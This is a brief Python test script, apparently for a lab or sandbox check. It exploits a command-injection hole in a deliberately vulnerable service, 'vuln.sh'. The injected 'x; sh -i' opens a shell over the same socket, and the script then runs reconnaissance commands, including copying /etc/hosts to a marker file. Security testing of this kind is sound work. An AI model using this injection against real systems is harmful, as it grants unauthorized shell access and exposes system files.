#!/usr/bin/env python3
"""Test only: use the hole in vuln.sh to get a shell on the same connection."""
import socket, sys, time
s = socket.create_connection((sys.argv[1], int(sys.argv[2])), timeout=10)
def send(line, wait=1.0):
    s.sendall(line.encode() + b'\n'); time.sleep(wait)
time.sleep(1)
send('x; sh -i')
for c in ['id', 'uname -sr', 'cat /etc/hosts > /tmp/jail-mark', 'cat /nonexistent-file',
          'sleep 30 & kill $!', 'env SECRET=xyz /bin/echo hello', 'exit']:
    send(c)
s.settimeout(2); out = b''
try:
    while True:
        b = s.recv(4096)
        if not b: break
        out += b
except OSError: pass
sys.stdout.write(out.decode(errors='replace'))
